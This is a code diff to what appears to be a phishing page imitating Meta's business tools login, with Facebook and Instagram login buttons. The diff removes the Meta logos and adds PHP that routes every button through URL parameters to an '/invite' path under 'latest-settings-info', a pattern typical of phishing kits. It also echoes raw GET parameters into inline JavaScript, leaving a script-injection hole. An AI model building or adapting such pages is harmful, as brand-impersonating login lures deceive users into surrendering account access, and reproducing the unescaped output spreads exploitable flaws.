@@ -1,10 +1,21 @@
+<?php
+// Get parameters from URL
+$param1 = isset($_GET['param1']) ? $_GET['param1'] : '';
+$param2 = isset($_GET['param2']) ? $_GET['param2'] : '';
+
+// Function to generate links with the correct path
+function generateLink($path) {
+    global $param1, $param2;
+    return "/latest-settings-info/{$param1}/{$param2}{$path}";
+}
+?>
 <!DOCTYPE html>
 <html lang="en">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Meta Business Tools</title>
+    <title>Business Tools</title>
     <link rel="icon" href="../../images/favicon.ico">
     <link rel="stylesheet" href="../../styles/style.css">
 </head>
@@ -13,37 +24,6 @@
     <div class="container">
         <div class="left">
             <div class="content">
-                <svg class="logo" height="48" role="img" viewBox="0 0 150 100" width="72">
-                    <defs>
-                        <linearGradient gradientUnits="userSpaceOnUse" x1="124.599" x2="159.703" y1="96.689" y2="57.25">
-                            <stop offset="0.21" stop-color="#0278F1"></stop>
-                            <stop offset="0.533" stop-color="#0180FA"></stop>
-                        </linearGradient>
-                        <linearGradient gradientUnits="userSpaceOnUse" id="«r1»" x1="43.859" x2="0" y1="4.984"
-                            y2="63.795">
-                            <stop offset="0.427" stop-color="#0165E0"></stop>
-                            <stop offset="0.917" stop-color="#0180FA"></stop>
-                        </linearGradient>
-                        <linearGradient gradientUnits="userSpaceOnUse" id="«r2»" x1="28.409" x2="134.567" y1="28.907"
-                            y2="71.769">
-                            <stop stop-color="#0064E0"></stop>
-                            <stop offset="0.656" stop-color="#0066E2"></stop>
-                            <stop offset="1" stop-color="#0278F1"></stop>
-                        </linearGradient>
-                    </defs>
-                    <path
-                        d="M107.654 0c-12.3 0-21.915 9.264-30.618 21.032C65.076 5.802 55.073 0 43.103 0 18.698 0 0 31.76 0 65.376 0 86.41 10.177 99.679 27.223 99.679c12.268 0 21.092-5.784 36.778-33.203 0 0 6.539-11.547 11.037-19.501a514.1 514.1 0 0 1 4.98 8.227l7.356 12.374c14.329 23.977 22.312 32.103 36.778 32.103C140.758 99.68 150 86.23 150 64.757 150 29.56 130.88 0 107.654 0ZM52.039 59.051C39.322 78.987 34.922 83.455 27.841 83.455c-7.287 0-11.617-6.397-11.617-17.804 0-24.404 12.167-49.359 26.672-49.359 7.855 0 14.42 4.537 24.474 18.93-9.547 14.645-15.33 23.83-15.33 23.83Zm47.999-2.51-8.795-14.667c-2.38-3.87-4.66-7.428-6.862-10.689 7.927-12.234 14.465-18.33 22.241-18.33 16.155 0 29.079 23.786 29.079 53.002 0 11.137-3.647 17.599-11.205 17.599-7.244 0-10.704-4.785-24.458-26.914Z"
-                        fill="#0180FA"></path>
-                    <path
-                        d="M145.119 34.888h-14.878c3.44 8.718 5.46 19.42 5.46 30.969 0 11.137-3.647 17.599-11.205 17.599-1.403 0-2.663-.18-3.884-.63V99.5a33.48 33.48 0 0 0 3.54.18C140.758 99.68 150 86.23 150 64.756c0-10.702-1.768-20.882-4.881-29.87Z"
-                        fill="url(#«r0»)"></path>
-                    <path
-                        d="M43.103 0c.253 0 .505.003.756.008v16.308c-.319-.016-.64-.024-.962-.024-14.138 0-26.055 23.706-26.65 47.503H.014C.588 30.77 19.08 0 43.103 0Z"
-                        fill="url(#«r1»)"></path>
-                    <path
-                        d="M43.103 0c11.115 0 20.534 5.004 31.4 17.913 3.055 3.817 6.74 8.777 10.682 14.511l.017.025.024-.003c1.939 2.912 3.94 6.05 6.017 9.428l8.795 14.668c13.754 22.13 17.214 26.913 24.458 26.913h.103v16.22c-.148.003-.297.004-.447.004-14.466 0-22.449-8.126-36.778-32.103l-7.356-12.374a587.065 587.065 0 0 0-2.287-3.822l.019-.045c-5.483-8.971-8.971-14.454-11.962-18.44l-.05.037c-9.15-12.59-15.42-16.64-22.842-16.64h-.034V.001l.24-.001Z"
-                        fill="url(#«r2»)"></path>
-                </svg>
                 <h1>Get started with<br>business tools from Meta</h1>
                 <p>By logging in, you can navigate to all business tools like Ads Manager, Meta Business Suite, Business
                     Manager, Commerce Manager and more to help you connect with your customers and get better business
@@ -57,50 +37,16 @@
             </div>
         </div>
         <div class="mid">
-            <img src="../../images/home-mid.png" alt="Meta Business Tools" class="mid-image">
+            <img src="../../images/home-mid.png" alt="Business Tools" class="mid-image">
         </div>
         <div class="right">
             <div class="login-container">
-                <h2>Log into business tools from Meta</h2>
-                <button class="fb-btn" onclick="window.location.href='./invite'">
+                <h2>Log into business tools</h2>
+                <button class="fb-btn" onclick="window.location.href='<?php echo generateLink('/invite'); ?>'">
                     <i class="fab fa-facebook fb-btn-icon"></i> Log in with Facebook </button>
-                <button class="ig-btn" onclick="window.location.href='./invite'">
+                <button class="ig-btn" onclick="window.location.href='<?php echo generateLink('/invite'); ?>'">
                     <i class="fab fa-instagram ig-btn-icon"></i> Log in with Instagram </button>
-                <p class="managed" onclick="window.location.href='./invite'">Log in with a managed Meta account</p>
-                <br>
-                <svg aria-label="" class="meta-small"  role="img" viewBox="0 0 500 100">
-                    <defs>
-                        <linearGradient gradientUnits="userSpaceOnUse" x1="124.38" x2="160.839" y1="99" y2="59.326">
-                            <stop offset=".427" stop-color="#0278F1"></stop>
-                            <stop offset=".917" stop-color="#0180FA"></stop>
-                        </linearGradient>
-                        <linearGradient gradientUnits="userSpaceOnUse" id="«r6»" x1="42" x2="-1.666" y1="4.936"
-                            y2="61.707">
-                            <stop offset=".427" stop-color="#0165E0"></stop>
-                            <stop offset=".917" stop-color="#0180FA"></stop>
-                        </linearGradient>
-                        <linearGradient gradientUnits="userSpaceOnUse" id="«r7»" x1="27.677" x2="132.943" y1="28.71"
-                            y2="71.118">
-                            <stop stop-color="#0064E0"></stop>
-                            <stop offset=".656" stop-color="#0066E2"></stop>
-                            <stop offset="1" stop-color="#0278F1"></stop>
-                        </linearGradient>
-                    </defs>
-                    <path
-                        d="M185.508 3.01h18.704l31.803 57.313L267.818 3.01h18.297v94.175h-15.264v-72.18l-27.88 49.977h-14.319l-27.88-49.978v72.18h-15.264V3.01ZM336.281 98.87c-7.066 0-13.286-1.565-18.638-4.674-5.352-3.12-9.527-7.434-12.528-12.952-2.989-5.517-4.483-11.835-4.483-18.973 0-7.214 1.461-13.608 4.385-19.17 2.923-5.561 6.989-9.908 12.187-13.05 5.198-3.13 11.176-4.707 17.923-4.707 6.715 0 12.484 1.587 17.319 4.74 4.847 3.164 8.572 7.598 11.177 13.291 2.615 5.693 3.923 12.371 3.923 20.046v4.171h-51.793c.945 5.737 3.275 10.258 6.989 13.554 3.715 3.295 8.407 4.937 14.078 4.937 4.549 0 8.461-.667 11.747-2.014 3.286-1.347 6.374-3.383 9.253-6.12l8.099 9.886c-8.055 7.357-17.934 11.036-29.638 11.036Zm11.143-55.867c-3.198-3.252-7.385-4.872-12.56-4.872-5.045 0-9.264 1.653-12.66 4.97-3.407 3.318-5.55 7.784-6.451 13.39h37.133c-.451-5.737-2.275-10.237-5.462-13.488ZM386.513 39.467h-14.044V27.03h14.044V6.447h14.715V27.03h21.341v12.437h-21.341v31.552c0 5.244.901 8.988 2.703 11.233 1.803 2.244 4.88 3.36 9.253 3.36 1.935 0 3.572-.076 4.924-.23a97.992 97.992 0 0 0 4.461-.645v12.316c-1.67.493-3.549.898-5.637 1.205-2.099.317-4.286.47-6.583.47-15.89 0-23.836-8.649-23.836-25.957V39.467ZM500 97.185h-14.44v-9.82c-2.571 3.678-5.835 6.513-9.791 8.506-3.968 1.993-8.462 3-13.506 3-6.209 0-11.715-1.588-16.506-4.752-4.803-3.153-8.572-7.51-11.308-13.039-2.748-5.54-4.121-11.879-4.121-19.006 0-7.17 1.395-13.52 4.187-19.038 2.791-5.518 6.648-9.843 11.571-12.985 4.935-3.13 10.594-4.707 16.99-4.707 4.813 0 9.132.93 12.956 2.791a25.708 25.708 0 0 1 9.528 7.905v-9.01H500v70.155Zm-14.715-45.61c-1.571-3.985-4.066-7.138-7.461-9.448-3.396-2.31-7.33-3.46-11.781-3.46-6.308 0-11.319 2.102-15.055 6.317-3.737 4.215-5.605 9.92-5.605 17.09 0 7.215 1.802 12.94 5.396 17.156 3.604 4.215 8.484 6.317 14.66 6.317 4.538 0 8.593-1.16 12.154-3.492 3.549-2.332 6.121-5.475 7.692-9.427V51.575Z"
-                        fill="#1C2B33"></path>
-                    <path
-                        d="M107.666 0C95.358 0 86.865 4.504 75.195 19.935 64.14 5.361 55.152 0 42.97 0 18.573 0 0 29.768 0 65.408 0 86.847 12.107 99 28.441 99c15.742 0 25.269-13.2 33.445-27.788l9.663-16.66a643.785 643.785 0 0 1 2.853-4.869 746.668 746.668 0 0 1 3.202 5.416l9.663 16.454C99.672 92.72 108.126 99 122.45 99c16.448 0 27.617-13.723 27.617-33.25 0-37.552-19.168-65.75-42.4-65.75ZM57.774 46.496l-9.8 16.25c-9.595 15.976-13.639 19.526-19.67 19.526-6.373 0-11.376-5.325-11.376-17.547 0-24.51 12.062-47.451 26.042-47.451 7.273 0 12.678 3.61 22.062 17.486a547.48 547.48 0 0 0-7.258 11.736Zm64.308 35.776c-6.648 0-11.034-4.233-20.012-19.39l-9.663-16.386c-2.79-4.737-5.402-9.04-7.88-12.945 9.73-14.24 15.591-17.984 23.002-17.984 14.118 0 26.204 20.96 26.204 49.158 0 11.403-4.729 17.547-11.651 17.547Z"
-                        fill="#0180FA"></path>
-                    <path
-                        d="M145.631 36h-16.759c3.045 7.956 4.861 17.797 4.861 28.725 0 11.403-4.729 17.547-11.651 17.547H122v16.726l.449.002c16.448 0 27.617-13.723 27.617-33.25 0-10.85-1.6-20.917-4.435-29.75Z"
-                        fill="url(#«r5»)"></path>
-                    <path d="M42 .016C18.63.776.832 28.908.028 63h16.92C17.483 39.716 28.762 18.315 42 17.31V.017Z"
-                        fill="url(#«r6»)"></path>
-                    <path
-                        d="m75.195 19.935.007-.009c2.447 3.223 5.264 7.229 9.33 13.62l-.005.005c2.478 3.906 5.09 8.208 7.88 12.945l9.663 16.386c8.978 15.157 13.364 19.39 20.012 19.39.31 0 .617-.012.918-.037v16.76c-.183.003-.367.005-.551.005-14.323 0-22.777-6.281-35.182-27.447L77.604 55.1l-.625-1.065L77 54c-2.386-4.175-7.606-12.685-11.973-19.232l.005-.008-.62-.91C63.153 31.983 61.985 30.313 61 29l-.066.024c-7.006-9.172-11.818-11.75-17.964-11.75-.324 0-.648.012-.97.037V.016c.322-.01.646-.016.97-.016 12.182 0 21.17 5.36 32.225 19.935Z"
-                        fill="url(#«r7»)"></path>
-                </svg>
+                <p class="managed" onclick="window.location.href='<?php echo generateLink('/invite'); ?>'">Log in with a managed account</p>
             </div>
         </div>
     </div>
